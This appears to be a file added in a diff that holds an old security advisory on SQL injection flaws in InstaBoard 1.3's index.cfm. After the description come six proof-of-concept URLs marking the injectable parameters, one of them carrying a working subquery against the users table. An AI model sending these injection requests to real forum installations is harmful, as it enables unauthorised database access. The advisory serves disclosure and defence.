@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/7338/info
+
+It has been reported that multiple input validation errors exist in the index.cfm file included with InstaBoard. Because of this issue, remote attackers may launch SQL injection attacks through the software.
+
+The consequences may vary depending on the particular database implementation and the nature of the specific queries. SQL injection also makes it possible, under some circumstances, to exploit latent vulnerabilities that may exist in the underlying database.
+
+It should be noted that although this vulnerability has been reported to affect InstaBoard version 1.3 previous versions might also be affected. 
+
+http://www.example.com/instaboard/index.cfm?frmid=1%20AND%20u.userid%20IN%20(select%20userid%20from%20users)
+http://www.example.com/instaboard/index.cfm?frmid=1&tpcid=1%20SQL
+http://www.example.com/instaboard/index.cfm?frmid=1%20SQL&tpcid=1
+http://www.example.com/instaboard/index.cfm?pr=replymsg&frmid=1&tpcid=1%20SQL&msgid=11
+http://www.example.com/instaboard/index.cfm?pr=replymsg&frmid=1&tpcid=1&msgid=11%20SQL
+http://www.example.com/instaboard/index.cfm?catid=1%20SQL 
